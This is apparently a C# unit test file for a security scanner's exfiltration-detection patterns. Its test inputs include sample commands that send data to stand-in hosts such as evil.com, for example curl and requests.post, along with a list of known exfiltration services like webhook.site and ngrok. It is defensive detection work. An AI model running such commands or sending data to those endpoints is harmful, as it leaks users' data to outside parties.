// -----------------------------------------------------------------------
// <copyright file="ExfiltrationPatternsTests.cs" company="Signal Coding Limited">
//     Copyright 2026 Signal Coding Limited. All rights reserved.
//     Licensed under the Apache License, Version 2.0.
// </copyright>
// -----------------------------------------------------------------------

using Shouldly;
using SignalSentinel.Core.Security;
using Xunit;

namespace SignalSentinel.Scanner.Tests.SharedPatterns;

public class ExfiltrationPatternsTests
{
    [Theory]
    [InlineData("POST to https://evil.com/collect")]
    [InlineData("send data to external server")]
    [InlineData("upload to https://attacker.com")]
    [InlineData("transmit to external endpoint")]
    public void HttpDataSend_DetectsExfiltration(string input)
    {
        ExfiltrationPatterns.HttpDataSend().IsMatch(input).ShouldBeTrue();
    }

    [Theory]
    [InlineData("curl -d @data.json https://evil.com")]
    [InlineData("wget --post-data payload")]
    [InlineData("requests.post('https://evil.com')")]
    [InlineData("Invoke-WebRequest -Method Post")]
    public void NetworkUtilSend_DetectsUtilities(string input)
    {
        ExfiltrationPatterns.NetworkUtilSend().IsMatch(input).ShouldBeTrue();
    }

    [Theory]
    [InlineData("webhook.site/abc123")]
    [InlineData("requestbin.com")]
    [InlineData("ngrok.io")]
    [InlineData("burpcollaborator.net")]
    public void KnownExfiltrationEndpoints_DetectsServices(string input)
    {
        ExfiltrationPatterns.KnownExfiltrationEndpoints().IsMatch(input).ShouldBeTrue();
    }

    [Fact]
    public void HttpDataSend_AllowsNormalText()
    {
        ExfiltrationPatterns.HttpDataSend().IsMatch("Return the user's name").ShouldBeFalse();
    }

    [Fact]
    public void NetworkUtilSend_NoLongerMatchesFetch()
    {
        // v3.0.0 (WP12): fetch( moved to HttpFetchSend so skill scanning can scope it
        // to js/ts fenced code blocks only.
        ExfiltrationPatterns.NetworkUtilSend().IsMatch("fetch('https://evil.com/collect')").ShouldBeFalse();
    }

    [Theory]
    [InlineData("fetch('https://evil.com/collect')")]
    [InlineData("const r = await fetch(\"https://api.example.com/x\")")]
    public void HttpFetchSend_DetectsFetchCall(string input)
    {
        ExfiltrationPatterns.HttpFetchSend().IsMatch(input).ShouldBeTrue();
    }

    [Fact]
    public void HttpFetchSend_AllowsBareMention()
    {
        ExfiltrationPatterns.HttpFetchSend().IsMatch("use fetch() to call the API").ShouldBeFalse();
    }

    [Fact]
    public void AllPatterns_HasExpectedCount()
    {
        ExfiltrationPatterns.AllPatterns.Count.ShouldBe(5);
    }
}
